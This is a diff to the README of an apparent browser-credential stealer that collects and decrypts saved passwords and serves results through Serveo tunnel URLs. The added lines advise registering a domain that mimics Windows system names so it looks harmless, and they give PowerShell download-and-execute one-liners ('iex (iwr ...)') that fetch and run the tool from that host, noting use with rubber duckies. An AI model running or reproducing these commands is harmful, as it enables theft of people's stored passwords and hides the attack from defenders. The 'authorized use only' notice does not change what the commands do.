@@ -7,6 +7,12 @@ A tool designed to securely collect and decrypt stored browser credentials from 
 3. Decrypts the passwords locally
 4. Every time you re-run the script it will get you a new Serveo URL such as https://28t8t8hgjh832h8hhoigi242ogn.serveo.net but the same one can be used many times until you stop the script from running.
 
+   If you have a custom domain, consider something like WindowsSys.Tools - this way you can create a catch all subdomain and customize it per engagement.
+
+```
+iex (iwr WindowsSys.Tools)
+iex (iwr System32.Windows.Sys.Tools)
+```
 ## 🚨 Important Notice
 
 This tool is intended for **AUTHORIZED USE ONLY**. Always obtain proper permissions before using on any system. Unauthorized use against systems you don't own or have explicit permission to test is illegal and unethical. Red team engagements and rubber duckies work awesome with this.
